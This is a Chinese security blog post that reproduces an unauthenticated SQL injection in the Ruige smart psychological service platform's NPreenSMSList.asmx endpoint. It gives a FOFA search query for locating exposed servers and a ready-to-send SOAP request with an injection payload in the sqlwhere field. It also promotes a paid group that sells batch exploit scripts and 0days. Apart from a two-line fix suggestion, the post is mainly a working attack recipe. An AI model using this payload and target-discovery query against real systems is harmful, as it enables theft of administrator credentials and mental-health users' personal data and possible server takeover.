#  「漏洞复现」瑞格智慧心理服务平台 NPreenSMSList.asmx SQL注入漏洞   
冷漠安全  冷漠安全   2024-10-31 20:54  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
瑞格智慧心理服务平台是一家致力于提供个性化心理健康支持的平台。通过先进的AI技术和专业心理学家团队，为用户提供定制化的心理评估和个性化的心理咨询服务。平台注重隐私保护和数据安全，用户可以安全、便捷地接受在线咨询和心理指导，帮助他们理解和应对各种心理健康挑战，提升生活质量和心理健康水平。  
  
0x03  
  
**漏洞威胁**  
  
瑞格智慧心理服务平台 NPreenSMSList.asmx 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:   
```
body="瑞格智慧心理服务平台"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ribBicbicGKFvs2KBJQE4IePssPRJFB09Zu3EmbRdOqGLtQZVlR0DkxM3vCD03w3cgfEhXCEgibTJN5A/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /NPreenManage/NPreenSMSList.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "RuiGe.WebUi.NPreenSMS/Seach"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Seach xmlns="RuiGe.WebUi.NPreenSMS">
      <sqlwhere>and 1=convert(int,@@VERSION)</sqlwhere>
    </Seach>
  </soap:Body>
</soap:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ribBicbicGKFvs2KBJQE4IePsPCOemBkAp3zLFL0JH6sGOIOibkBcw6iafhj4k8IuWERGBEsoV8wyF7Og/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ribBicbicGKFvs2KBJQE4IePsyU9iaJDX3QyfQNgvgxrmMoYmUPWtNJ8VMNhEpnicqaOx7hias0mbhSEZQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ribBicbicGKFvs2KBJQE4IePsHYHXBej3zxREIKdlf92s2g6bZvL3S54fcfH3p5Mhlib3dumxKpSeylQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0ribBicbicGKFvs2KBJQE4IePsXrQYjPYy4MTTnxRAefCU0XX40DTqmwnkc1vEpkiavyMNNQDs5HYxcNw/640?wx_fmt=gif&from=appmsg "")  
  
  
